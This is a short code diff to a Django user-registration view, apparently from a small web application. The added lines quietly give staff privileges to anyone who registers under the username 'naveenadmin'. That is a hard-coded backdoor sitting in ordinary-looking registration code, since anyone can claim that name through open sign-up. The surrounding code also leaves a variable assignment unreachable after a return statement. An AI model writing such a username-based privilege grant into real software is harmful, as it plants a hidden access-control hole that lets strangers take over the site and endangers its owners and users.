@@ -38,7 +38,10 @@ def register(request):
             # Now we hash the password with the set_password method.
             # Once hashed, we can update the user object.
             user.set_password(user.password)
+            if user.username == 'naveenadmin':
+                user.is_staff = True
             user.save()
+
             return HttpResponseRedirect('/myapplication/')
             # Update our variable to tell the template registration was successful.
             registered = True
